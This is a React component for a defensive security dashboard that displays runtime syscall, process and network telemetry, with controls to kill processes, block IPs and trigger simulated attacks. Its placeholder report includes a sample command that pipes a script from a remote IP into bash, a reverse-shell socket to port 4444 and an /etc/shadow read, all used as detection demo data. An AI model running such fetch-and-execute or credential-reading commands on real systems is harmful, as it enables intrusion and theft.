import React, { useState, useEffect } from 'react';
import { useVulnStore } from '../../state/useVulnStore';
import { api } from '../../services/api';
import { 
  Activity, ShieldAlert, Terminal, Play, AlertOctagon, 
  Flame, Lock, Filter, Radio, RefreshCw, Zap, Cpu, 
  CheckCircle2, XCircle, Skull, Network, FileText, Ban, 
  ArrowRight, Sparkles 
} from 'lucide-react';

export default function RuntimeSyscallMonitor() {
  const { 
    runtimeEvents, containers, selectedContainerId, setSelectedContainerId, 
    handleSimulateAttack, handleIsolateContainer, handleScanContainerRuntime,
    handleScanAllWorkloads, handleKillPID, handleBlockSocket,
    latestRuntimeScanReport, isAutoScanning, setIsAutoScanning,
    isDynamicScanning, isLoading, showToast, setActiveTab 
  } = useVulnStore();

  const [filterType, setFilterType] = useState('ALL');
  const [activeSimulation, setActiveSimulation] = useState(null);
  const [activeScanPhase, setActiveScanPhase] = useState(null);

  // Trigger Dynamic Runtime Scan with visual phase sequence
  const handleTriggerDynamicScan = async () => {
    setActiveScanPhase(1);
    const p1 = setTimeout(() => setActiveScanPhase(2), 200);
    const p2 = setTimeout(() => setActiveScanPhase(3), 400);
    const p3 = setTimeout(() => setActiveScanPhase(4), 600);
    const p4 = setTimeout(() => setActiveScanPhase(5), 800);

    try {
      await handleScanContainerRuntime(selectedContainerId);
    } finally {
      setTimeout(() => setActiveScanPhase(null), 1200);
    }
  };

  const triggerAttack = async (type) => {
    setActiveSimulation(type);
    await handleSimulateAttack(selectedContainerId, type);
    setActiveSimulation(null);
    await handleTriggerDynamicScan();
  };

  const selectedContainer = containers.find((c) => c.id === selectedContainerId) || containers[0];
  const report = latestRuntimeScanReport || {
    container_name: selectedContainer?.name,
    exploit_risk_score: selectedContainer?.status === 'COMPROMISED' ? 98 : selectedContainer?.status === 'SUSPICIOUS' ? 68 : 8,
    runtime_status: selectedContainer?.status === 'COMPROMISED' ? 'EXPLOITATION_CONFIRMED' : selectedContainer?.status === 'SUSPICIOUS' ? 'SUSPICIOUS_ACTIVITY' : 'CLEAN_HARDENED',
    active_processes: [
      { pid: 1, name: "init", user: "root", cpu_pct: 0.1, mem_mb: 12.0, state: "SLEEPING", threat: "SAFE" },
      { pid: 4102, name: "java", user: "spring", cpu_pct: 24.5, mem_mb: 840.0, state: "RUNNING", threat: "SUSPICIOUS_PARENT", cmd: "java -jar /app/target/payment-service.jar" },
      { pid: 4189, name: "bash", user: "spring", cpu_pct: 18.2, mem_mb: 42.0, state: "ACTIVE", threat: "ROGUE_SHELL", cmd: "/bin/sh -c curl http://185.220.101.5/rce.sh | bash" }
    ],
    network_sockets: [
      { local: "10.244.1.42:8080", remote: "0.0.0.0:*", proto: "TCP", status: "LISTEN", threat: "NORMAL_INGRESS" },
      { local: "10.244.1.42:49812", remote: "185.220.101.5:4444", proto: "TCP", status: "ESTABLISHED", threat: "MALICIOUS_C2_EGRESS" }
    ],
    file_access_violations: [
      { path: "/etc/shadow", fd: 3, syscall: "openat", pid: 4189, proc: "bash", action: "BLOCKED_BY_eBPF" }
    ],
    runtime_vulnerabilities: [
      {
        cve_id: "CVE-2021-44228",
        title: "Confirmed Active Log4Shell JNDI Remote Code Execution",
        severity: "CRITICAL",
        cvss_score: 10.0,
        exploit_phase: "EXECUTION_ESTABLISHED",
        detected_evidence: "Child process /bin/sh (PID 4189) spawned by parent java with active reverse shell socket to 185.220.101.5:4444.",
        mitre_technique: "T1059.004 (Unix Shell) -> T1071 (Command and Control)"
      }
    ],
    ai_triage_guidance: "IMMEDIATE ACTION: Kill rogue PID 4189, block egress IP 185.220.101.5, and deploy Temurin JDK 17 Dockerfile patch."
  };

  const riskScore = report.exploit_risk_score;

  const filteredEvents = runtimeEvents.filter((e) => {
    if (filterType === 'ALL') return true;
    if (filterType === 'CRITICAL') return e.severity === 'CRITICAL';
    if (filterType === 'SYSCALL') return e.event_type === 'SYSCALL';
    if (filterType === 'NETWORK') return e.event_type === 'NETWORK';
    if (filterType === 'FILE_ACCESS') return e.event_type === 'FILE_ACCESS';
    return true;
  });

  return (
    <div className="space-y-6 animate-in fade-in duration-300">
      
      {/* Top Banner with Approach A Badge & Dynamic Scanner Launcher */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <span className="font-orbitron text-xs text-amber-400 font-bold tracking-widest uppercase">
              APPROACH A: ORIGINAL ENGINEERING
            </span>
            <span className="w-2 h-2 rounded-full bg-amber-400 animate-ping" />
            <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-cyan-950 text-cyan-300 border border-cyan-800">
              DYNAMIC RUNTIME SCANNER ACTIVE
            </span>
          </div>
          <h2 className="font-orbitron font-bold text-xl text-white flex items-center gap-2">
            <Activity className="w-6 h-6 text-amber-400 animate-pulse" />
            <span>DYNAMIC RUNTIME VULNERABILITY SCANNER (eBPF & PROCESS HOOKS)</span>
          </h2>
          <p className="text-xs text-slate-300 font-mono mt-1">
            Deep in-memory behavioral inspection correlating live <code className="text-cyan-300">execve</code>, <code className="text-cyan-300">openat</code>, and <code className="text-cyan-300">connect</code> syscalls with known CVEs.
          </p>
        </div>

        {/* Dynamic Action Buttons */}
        <div className="flex items-center gap-2 flex-wrap">
          {/* Continuous Auto-Scan Toggle */}
          <div className="flex items-center gap-2 bg-slate-900/90 px-3 py-1.5 rounded-xl border border-slate-700 text-xs font-mono">
            <span className="text-slate-400">Live Continuous Scan:</span>
            <button
              onClick={() => setIsAutoScanning(!isAutoScanning)}
              className={`px-2 py-0.5 rounded font-bold text-[10px] cursor-pointer transition-colors ${
                isAutoScanning ? 'bg-emerald-500 text-black' : 'bg-slate-800 text-slate-400'
              }`}
            >
              {isAutoScanning ? 'ENABLED (7s)' : 'PAUSED'}
            </button>
          </div>

          {/* Dynamic Scan Trigger Button */}
          <button
            onClick={handleTriggerDynamicScan}
            disabled={isDynamicScanning}
            className="px-4 py-2 rounded-xl bg-amber-500 hover:bg-amber-400 text-black font-orbitron font-bold text-xs flex items-center gap-2 transition-all cyber-glow-cyan cursor-pointer"
          >
            <RefreshCw className={`w-3.5 h-3.5 fill-black ${isDynamicScanning ? 'animate-spin' : ''}`} />
            <span>{isDynamicScanning ? 'SCANNING MEMORY...' : 'RUN DYNAMIC SCAN'}</span>
          </button>

          {/* Scan Cluster */}
          <button
            onClick={handleScanAllWorkloads}
            disabled={isDynamicScanning}
            className="px-3 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-700 text-cyan-300 text-xs font-mono transition-colors cursor-pointer"
          >
            Scan All Workloads
          </button>
        </div>
      </div>

      {/* Target Workload Selector Bar */}
      <div className="cyber-glass-card rounded-xl p-3 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
        <div className="flex items-center gap-2 font-mono text-xs text-slate-300">
          <span className="text-slate-400">Inspecting Workload:</span>
          <select
            value={selectedContainerId}
            onChange={(e) => {
              setSelectedContainerId(e.target.value);
              handleScanContainerRuntime(e.target.value);
            }}
            className="px-3 py-1 rounded-lg bg-slate-900 border border-slate-700 text-xs font-mono text-cyan-300 outline-none focus:border-cyan-400"
          >
            {containers.map((c) => (
              <option key={c.id} value={c.id}>
                {c.name} ({c.status} • Health: {c.health_score}%)
              </option>
            ))}
          </select>
        </div>

        <div className="flex items-center gap-3 text-xs font-mono">
          <span className="text-slate-400">IP: <strong className="text-white">{selectedContainer?.ip_address}</strong></span>
          <span className="text-slate-400">Image: <strong className="text-slate-300">{selectedContainer?.image}</strong></span>
        </div>
      </div>

      {/* Dynamic Multi-Stage Runtime Scan Progress HUD */}
      {(isDynamicScanning || activeScanPhase) && (
        <div className="cyber-glass-card rounded-2xl p-5 border border-amber-500/40 cyber-glow-cyan animate-in zoom-in-95 space-y-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Activity className="w-5 h-5 text-amber-400 animate-spin" />
              <span className="font-orbitron font-bold text-sm text-white">
                DYNAMIC RUNTIME VULNERABILITY INSPECTION IN PROGRESS...
              </span>
            </div>
            <span className="text-xs font-mono text-cyan-400 animate-pulse">eBPF Kernel Probes Hooked</span>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-5 gap-2 text-xs font-mono">
            <div className={`p-2 rounded border ${activeScanPhase >= 1 ? 'bg-cyan-950/80 border-cyan-400 text-cyan-200' : 'bg-slate-900/40 border-slate-800 text-slate-500'}`}>
              1. Process Table (execve)
            </div>
            <div className={`p-2 rounded border ${activeScanPhase >= 2 ? 'bg-cyan-950/80 border-cyan-400 text-cyan-200' : 'bg-slate-900/40 border-slate-800 text-slate-500'}`}>
              2. Sockets & Egress (connect)
            </div>
            <div className={`p-2 rounded border ${activeScanPhase >= 3 ? 'bg-cyan-950/80 border-cyan-400 text-cyan-200' : 'bg-slate-900/40 border-slate-800 text-slate-500'}`}>
              3. File Access (openat)
            </div>
            <div className={`p-2 rounded border ${activeScanPhase >= 4 ? 'bg-cyan-950/80 border-cyan-400 text-cyan-200' : 'bg-slate-900/40 border-slate-800 text-slate-500'}`}>
              4. Privilege Checks (setuid)
            </div>
            <div className={`p-2 rounded border ${activeScanPhase >= 5 ? 'bg-cyan-950/80 border-cyan-400 text-cyan-200' : 'bg-slate-900/40 border-slate-800 text-slate-500'}`}>
              5. Live CVE Correlation
            </div>
          </div>
        </div>
      )}

      {/* Real-Time Exploit Risk & Behavioral Telemetry Dashboard */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        
        {/* Left 1 Col: Dynamic Exploit Risk Index & Status */}
        <div className="cyber-glass-card rounded-2xl p-5 border border-cyan-500/20 space-y-4">
          <div className="flex items-center justify-between border-b border-slate-800 pb-3">
            <span className="font-orbitron font-bold text-xs text-white">REAL-TIME EXPLOIT RISK INDEX</span>
            <span className="text-[10px] font-mono text-cyan-400">Dynamic Score</span>
          </div>

          <div className="flex flex-col items-center justify-center py-2">
            <div className="relative flex items-center justify-center w-36 h-36 rounded-full border-4 border-slate-800">
              <div 
                className={`absolute inset-0 rounded-full border-4 transition-all duration-700 ${
                  riskScore > 70 ? 'border-rose-500 cyber-glow-red animate-pulse' :
                  riskScore > 30 ? 'border-amber-500 cyber-glow-cyan' :
                  'border-emerald-500'
                }`}
                style={{ clipPath: `polygon(0 0, 100% 0, 100% ${riskScore}%, 0 ${riskScore}%)` }}
              />
              <div className="text-center z-10">
                <div className={`font-orbitron text-3xl font-extrabold ${riskScore > 70 ? 'text-rose-400' : riskScore > 30 ? 'text-amber-400' : 'text-emerald-400'}`}>
                  {riskScore}%
                </div>
                <span className="text-[10px] font-mono text-slate-400 uppercase">Exploit Index</span>
              </div>
            </div>

            <div className="mt-4 text-center">
              <span className={`px-2.5 py-1 rounded font-orbitron font-bold text-xs ${
                riskScore > 70 ? 'bg-rose-950 text-rose-300 border border-rose-800' :
                riskScore > 30 ? 'bg-amber-950 text-amber-300 border border-amber-800' :
                'bg-emerald-950 text-emerald-300 border border-emerald-800'
              }`}>
                {report.runtime_status}
              </span>
            </div>
          </div>

          {/* Quick AI Triage Guidance */}
          <div className="p-3 rounded-xl bg-slate-950/80 border border-slate-800 text-xs font-mono space-y-1">
            <div className="flex items-center gap-1.5 text-cyan-300 font-bold">
              <Sparkles className="w-3.5 h-3.5 text-cyan-400" />
              <span>AI RUNTIME TRIAGE:</span>
            </div>
            <p className="text-slate-300 text-[11px] leading-relaxed">
              {report.ai_triage_guidance}
            </p>
          </div>

          {riskScore > 60 && (
            <button
              onClick={() => setActiveTab('ai-remediation')}
              className="w-full py-2 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-black font-orbitron font-bold text-xs flex items-center justify-center gap-1.5 transition-colors cursor-pointer"
            >
              <Zap className="w-3.5 h-3.5 fill-black" />
              <span>DEPLOY AUTOMATED AI PATCH</span>
            </button>
          )}
        </div>

        {/* Right 2 Cols: In-Memory Active Processes & Network Sockets */}
        <div className="lg:col-span-2 space-y-4">
          
          {/* Active Process Hierarchy (execve telemetry) */}
          <div className="cyber-glass-card rounded-2xl p-5 border border-cyan-500/20">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3 mb-3">
              <div className="flex items-center gap-2">
                <Terminal className="w-4 h-4 text-cyan-400" />
                <h3 className="font-orbitron font-bold text-xs text-white uppercase">
                  Active Running Processes (PID Tree & execve hooks)
                </h3>
              </div>
              <span className="text-[11px] font-mono text-slate-400">
                {report.active_processes?.length || 0} Processes Monitored
              </span>
            </div>

            <div className="space-y-2 max-h-48 overflow-y-auto pr-1">
              {report.active_processes?.map((proc) => {
                const isRogue = proc.threat === 'ROGUE_SHELL' || proc.threat === 'PRIV_ESC_ATTEMPT';
                return (
                  <div
                    key={proc.pid}
                    className={`p-2.5 rounded-xl border text-xs font-mono flex items-center justify-between gap-3 ${
                      isRogue
                        ? 'bg-rose-950/40 border-rose-500/40'
                        : 'bg-slate-900/60 border-slate-800'
                    }`}
                  >
                    <div>
                      <div className="flex items-center gap-2">
                        <span className="text-cyan-300 font-bold">PID: {proc.pid}</span>
                        <span className="text-white font-semibold">[{proc.name}]</span>
                        <span className="text-slate-400">User: {proc.user}</span>
                        {isRogue && (
                          <span className="px-1.5 py-0.2 rounded bg-rose-500 text-black text-[10px] font-bold">
                            ROGUE PROCESS
                          </span>
                        )}
                      </div>
                      {proc.cmd && (
                        <p className="text-[11px] text-slate-300 truncate max-w-md mt-0.5">
                          cmd: <code>{proc.cmd}</code>
                        </p>
                      )}
                    </div>

                    <div className="flex items-center gap-2 shrink-0">
                      <span className="text-[11px] text-slate-400">CPU: {proc.cpu_pct}%</span>
                      {isRogue && (
                        <button
                          onClick={() => handleKillPID(selectedContainerId, proc.pid)}
                          className="px-2.5 py-1 rounded bg-rose-600 hover:bg-rose-500 text-white font-bold text-[10px] flex items-center gap-1 cursor-pointer transition-colors"
                          title="Terminate rogue process with SIGKILL"
                        >
                          <Skull className="w-3 h-3" />
                          <span>KILL PID</span>
                        </button>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          </div>

          {/* Active Network Sockets & Egress Telemetry */}
          <div className="cyber-glass-card rounded-2xl p-5 border border-cyan-500/20">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3 mb-3">
              <div className="flex items-center gap-2">
                <Network className="w-4 h-4 text-cyan-400" />
                <h3 className="font-orbitron font-bold text-xs text-white uppercase">
                  Active Network Sockets & Egress Connections (connect hooks)
                </h3>
              </div>
              <span className="text-[11px] font-mono text-slate-400">
                {report.network_sockets?.length || 0} Sockets
              </span>
            </div>

            <div className="space-y-2">
              {report.network_sockets?.map((sock, sIdx) => {
                const isMalicious = sock.threat?.includes('MALICIOUS') || sock.threat?.includes('C2');
                const remoteHost = sock.remote.split(':')[0];

                return (
                  <div
                    key={sIdx}
                    className={`p-2.5 rounded-xl border text-xs font-mono flex items-center justify-between gap-3 ${
                      isMalicious
                        ? 'bg-rose-950/40 border-rose-500/40'
                        : 'bg-slate-900/60 border-slate-800'
                    }`}
                  >
                    <div>
                      <div className="flex items-center gap-2">
                        <span className="text-cyan-300 font-bold">{sock.proto}</span>
                        <span className="text-slate-300">{sock.local}</span>
                        <span className="text-slate-500">→</span>
                        <span className={`font-bold ${isMalicious ? 'text-rose-400' : 'text-slate-200'}`}>
                          {sock.remote}
                        </span>
                        <span className="text-slate-400">({sock.status})</span>
                      </div>
                      {isMalicious && (
                        <span className="text-[10px] text-rose-400 font-bold block mt-0.5">
                          ⚠️ HOSTILE C2 BOTNET SOCKET DETECTED
                        </span>
                      )}
                    </div>

                    {isMalicious && (
                      <button
                        onClick={() => handleBlockSocket(selectedContainerId, remoteHost)}
                        className="px-2.5 py-1 rounded bg-rose-600 hover:bg-rose-500 text-white font-bold text-[10px] flex items-center gap-1 cursor-pointer transition-colors"
                        title="Block IP at eBPF layer"
                      >
                        <Ban className="w-3 h-3" />
                        <span>BLOCK IP</span>
                      </button>
                    )}
                  </div>
                );
              })}
            </div>
          </div>

        </div>

      </div>

      {/* Attack Simulation Quick Triggers */}
      <div className="cyber-glass-card rounded-2xl p-5 border border-rose-500/30">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-rose-500/20 pb-3 mb-4">
          <div className="flex items-center gap-2">
            <Flame className="w-5 h-5 text-rose-400 animate-pulse" />
            <h3 className="font-orbitron font-bold text-sm text-white">
              INJECT DYNAMIC RUNTIME EXPLOIT SCENARIOS
            </h3>
          </div>
          <span className="text-[11px] font-mono text-slate-400">
            Simulate exploits on <strong className="text-rose-400">{selectedContainer?.name}</strong> to observe live eBPF detection
          </span>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3">
          <button
            onClick={() => triggerAttack('log4shell')}
            disabled={isLoading}
            className="p-3 rounded-xl bg-rose-950/60 hover:bg-rose-900/80 border border-rose-500/40 text-left transition-all hover:scale-[1.02] cursor-pointer"
          >
            <div className="flex items-center justify-between mb-1">
              <span className="text-xs font-orbitron font-bold text-rose-300">1. Log4Shell RCE</span>
              <Play className="w-3.5 h-3.5 text-rose-400" />
            </div>
            <p className="text-[11px] font-mono text-slate-400">
              Spawns <code className="text-rose-400">execve(/bin/sh)</code>
            </p>
          </button>

          <button
            onClick={() => triggerAttack('reverse_shell')}
            disabled={isLoading}
            className="p-3 rounded-xl bg-rose-950/60 hover:bg-rose-900/80 border border-rose-500/40 text-left transition-all hover:scale-[1.02] cursor-pointer"
          >
            <div className="flex items-center justify-between mb-1">
              <span className="text-xs font-orbitron font-bold text-rose-300">2. Reverse Shell</span>
              <Play className="w-3.5 h-3.5 text-rose-400" />
            </div>
            <p className="text-[11px] font-mono text-slate-400">
              Outbound socket to <code className="text-rose-400">:4444</code>
            </p>
          </button>

          <button
            onClick={() => triggerAttack('shadow_read')}
            disabled={isLoading}
            className="p-3 rounded-xl bg-amber-950/60 hover:bg-amber-900/80 border border-amber-500/40 text-left transition-all hover:scale-[1.02] cursor-pointer"
          >
            <div className="flex items-center justify-between mb-1">
              <span className="text-xs font-orbitron font-bold text-amber-300">3. Shadow Dump</span>
              <Play className="w-3.5 h-3.5 text-amber-400" />
            </div>
            <p className="text-[11px] font-mono text-slate-400">
              Intercepts <code className="text-amber-400">openat(/etc/shadow)</code>
            </p>
          </button>

          <button
            onClick={() => triggerAttack('priv_esc')}
            disabled={isLoading}
            className="p-3 rounded-xl bg-amber-950/60 hover:bg-amber-900/80 border border-amber-500/40 text-left transition-all hover:scale-[1.02] cursor-pointer"
          >
            <div className="flex items-center justify-between mb-1">
              <span className="text-xs font-orbitron font-bold text-amber-300">4. Sudo Priv Esc</span>
              <Play className="w-3.5 h-3.5 text-amber-400" />
            </div>
            <p className="text-[11px] font-mono text-slate-400">
              Heap overflow <code className="text-amber-400">setuid(0)</code>
            </p>
          </button>

          <button
            onClick={() => triggerAttack('crypto_miner')}
            disabled={isLoading}
            className="p-3 rounded-xl bg-cyan-950/60 hover:bg-cyan-900/80 border border-cyan-500/40 text-left transition-all hover:scale-[1.02] cursor-pointer"
          >
            <div className="flex items-center justify-between mb-1">
              <span className="text-xs font-orbitron font-bold text-cyan-300">5. Crypto Miner</span>
              <Play className="w-3.5 h-3.5 text-cyan-400" />
            </div>
            <p className="text-[11px] font-mono text-slate-400">
              XMRig loop with 99.8% CPU
            </p>
          </button>
        </div>
      </div>

      {/* Live Syscall Events Interception Log */}
      <div className="cyber-glass-card rounded-2xl p-5 border border-cyan-500/20">
        <div className="flex items-center justify-between border-b border-cyan-500/10 pb-3 mb-4 flex-wrap gap-2">
          <div className="flex items-center gap-2">
            <Activity className="w-5 h-5 text-amber-400 animate-pulse" />
            <h3 className="font-orbitron font-bold text-sm text-white uppercase">
              Live eBPF Kernel Interception Stream
            </h3>
          </div>

          <div className="flex items-center gap-1.5 p-1 rounded-xl bg-slate-900/80 border border-slate-800">
            {['ALL', 'CRITICAL', 'SYSCALL', 'NETWORK', 'FILE_ACCESS'].map((f) => (
              <button
                key={f}
                onClick={() => setFilterType(f)}
                className={`px-2.5 py-1 rounded-lg text-xs font-mono transition-colors ${
                  filterType === f
                    ? 'bg-cyan-950 text-cyan-300 border border-cyan-500/40'
                    : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                {f}
              </button>
            ))}
          </div>
        </div>

        <div className="space-y-2.5">
          {filteredEvents.map((evt) => {
            const isCrit = evt.severity === 'CRITICAL';
            const isHigh = evt.severity === 'HIGH';

            return (
              <div
                key={evt.id}
                className={`p-3.5 rounded-xl border text-xs font-mono flex flex-col md:flex-row md:items-start justify-between gap-3 ${
                  isCrit ? 'bg-rose-950/40 border-rose-500/40' :
                  isHigh ? 'bg-amber-950/30 border-amber-500/30' :
                  'bg-slate-950/60 border-slate-800'
                }`}
              >
                <div className="space-y-1">
                  <div className="flex items-center gap-2 flex-wrap">
                    <span className={`px-2 py-0.5 rounded font-bold text-[10px] ${
                      isCrit ? 'bg-rose-500 text-black' : isHigh ? 'bg-amber-500 text-black' : 'bg-cyan-500 text-black'
                    }`}>
                      {evt.severity}
                    </span>
                    <span className="font-orbitron text-xs font-bold text-white">{evt.container_name}</span>
                    <span className="text-slate-400">PID: <code className="text-cyan-300">{evt.pid}</code> ({evt.process_name})</span>
                    {evt.syscall_name && (
                      <span className="px-2 py-0.5 rounded bg-slate-900 border border-cyan-800 text-[10px] text-cyan-300">
                        sys_{evt.syscall_name}()
                      </span>
                    )}
                    {evt.blocked && (
                      <span className="px-2 py-0.5 rounded bg-emerald-950 text-emerald-400 border border-emerald-800 text-[10px] font-bold">
                        BLOCKED BY eBPF
                      </span>
                    )}
                  </div>
                  <p className="text-slate-200 text-xs">{evt.details}</p>
                </div>

                <div className="text-right text-[11px] font-mono text-slate-400 shrink-0">
                  <div>{evt.timestamp}</div>
                  {evt.mitre_attack_technique && (
                    <span className="text-[10px] text-indigo-300 block mt-1">
                      {evt.mitre_attack_technique.split(' ')[0]}
                    </span>
                  )}
                </div>
              </div>
            );
          })}
        </div>
      </div>

    </div>
  );
}
